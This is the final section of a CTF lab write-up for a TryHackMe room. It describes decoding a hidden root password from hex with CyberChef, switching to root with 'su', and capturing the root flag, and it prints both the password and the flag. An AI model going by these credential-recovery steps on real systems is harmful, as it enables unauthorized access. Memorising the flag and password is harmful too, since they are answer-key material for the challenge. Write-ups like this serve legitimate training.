<img src="./images/29-hex-offset.png" alt="Step 13a — Hex Editor at Offset 0x20" width="900"/>

**🖼️ Screenshot 29** — Hex editor showing 16 bytes at offset `0x00000020`

<br><br>

<!-- 📸 IMAGE 30: CyberChef recipe From Hex → To Base85 -->
<img src="./images/30-cyberchef-recipe.png" alt="Step 13b — CyberChef Recipe" width="900"/>

**🖼️ Screenshot 30** — CyberChef: `From Hex` → `To Base85` → `root:Go0odJo0BbBro0o`

</div>

---

<div align="center">

## 👑 **STAGE 14 — ROOT FLAG**

</div>

<div align="center">

<!-- 📸 IMAGE 31: su root success + whoami -->
<img src="./images/31-su-root.png" alt="Step 14a — su root" width="900"/>

**🖼️ Screenshot 31** — `su root` with recovered password → root shell

<br><br>

<!-- 📸 IMAGE 32: cat root.txt -->
<img src="./images/32-root-flag.png" alt="Step 14b — Root Flag Captured" width="900"/>

**🖼️ Screenshot 32** — Root flag captured: `THM{c5a9d3e4147a13cbd1ca24b014466a6c}`

<br><br>

<!-- 📸 IMAGE 33: room 100% complete -->
<img src="./images/33-room-complete.png" alt="Step 14c — Room 100% Complete" width="900"/>

**🖼️ Screenshot 33** — Room completed at 100% ✅

</div>

---

<div align="center">

# 📜 **DISCLAIMER**

</div>

> This write-up documents testing performed exclusively against the intentionally vulnerable **Different CTF** VM (TryHackMe) in an isolated personal lab, for educational purposes only. Do not use these techniques against systems you do not own or lack explicit authorization to test.

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0f0c29,50:302b63,100:24243e&height=180&section=footer&text=Happy%20Hacking!&fontSize=50&fontColor=F75C03&animation=twinkling&fontAlignY=70"/>

<br>

**Author:** Nishant Saini · [GitHub](https://github.com/nishantsaini5786)

⭐ **If this helped you, consider starring the repo!**

<br>

<img src="https://user-images.githubusercontent.com/74038190/212284158-e840e285-664b-44d7-b79b-e264b5e54825.gif" width="500">

</div>
